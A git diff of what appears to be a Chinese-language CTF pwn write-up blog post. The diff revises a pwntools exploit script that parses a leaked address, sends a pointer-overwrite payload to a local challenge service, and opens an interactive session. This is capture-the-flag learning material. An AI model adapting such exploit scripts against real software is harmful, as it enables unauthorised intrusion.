@@ -7,6 +7,7 @@ image: '/images/post/26.9.15.png'
 tags: ['pwn','wp']
 category: 'wp'
 toc: true
+
 ---
 
 # 一天写一题，我速度真够吧快!.jpg
@@ -278,25 +279,31 @@ func(badge);
 ```python
 from pwn import *
 
-context.binary = './pwn'
-p = process(['./libs/ld-linux-x86-64.so.2', '--library-path', './libs', './pwn'])
+context.arch = 'amd64'
+context.log_level = 'info'
 
-p.recvuntil(b'profile: ')
-profile = int(p.recvline().strip(), 16)  
+io = remote('127.0.0.1', 63944)
 
-payload = b'A' * 0x30                   
-payload += p64(profile + 0x48)          
-payload += p64(profile + 0x48)        
-payload += p64(profile + 0x50)           
+io.recvuntil(b'profile: ')
+profile = int(io.recvline().strip(), 16)
 
-p.send(payload)
+payload  = b'A' * 0x30
+payload += p64(profile)            
+payload += p64(profile + 0x48)     
+payload += p64(profile + 0x50)    
+assert len(payload) == 0x48
 
-p.recvuntil(b'win: ')
-win = int(p.recvline().strip(), 16)
-p.recvuntil(b'style data: ')
-p.sendline(str(win).encode())            
+io.recvuntil(b'name: ')
+io.send(payload)                 
 
-p.interactive()                
+io.recvuntil(b'win: ')
+win = int(io.recvline().strip(), 16)
+
+io.recvuntil(b'style data: ')
+io.sendline(str(win).encode())
+
+io.recvuntil(b'checking...')
+io.interactive()
 
 ```
 
